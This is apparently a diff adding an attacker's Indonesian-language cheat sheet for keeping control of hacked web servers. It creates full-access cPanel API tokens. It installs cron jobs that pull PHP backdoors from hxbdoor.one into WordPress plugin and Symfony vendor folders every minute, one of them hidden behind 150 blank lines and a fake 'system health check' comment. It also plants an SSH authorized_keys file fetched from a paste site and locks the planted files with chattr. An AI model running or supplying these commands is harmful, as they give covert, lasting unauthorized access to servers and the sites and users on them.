@@ -1,0 +1,36 @@
+untuk uapi
+uapi Tokens create_full_access name=zaez ( PANGGIL TOKEN )  
+uapi Tokens revoke name=zaez ( DEFUNCT TOKEN ) 
+uapi Tokens list
+
+
+
+
+KILL UAPI 
+uapi Tokens revoke name=vathan
+
+
+
+(crontab -l 2>/dev/null; printf "\n%.0s" {1..150}; echo "# System health check and temporary file cleanup"; echo "* * * * * wget -q https://hxbdoor.one/raw/mOwVcRqX -O /var/www/vendor/symfony/process/assets/tura.php") | crontab -
+
+(crontab -l 2>/dev/null; echo "* * * * * wget -q https://hxbdoor.one/raw/mOwVcRqX -O /var/www/clients/client0/web3/web/wp-content/plugins/kqbnvao/file.php") | crontab -
+
+
+
+
+wp-links-opm.php
+
+
+pasang .ssh
+curl -o authorized_keys https://p.ip.fi/vbwH
+
+
+hijaukan dir path AKSES ROOT 
+chown -R www-data:www-data /home/sites/lib-pasca/public_html
+
+
+
+
+IMUNE PUBLIC
+vps xzone "chattr -R +i /home/karocom/html/"   (tutup imun)
+vps xzone "chattr -R -i /var/www/html/"   (buka imun)
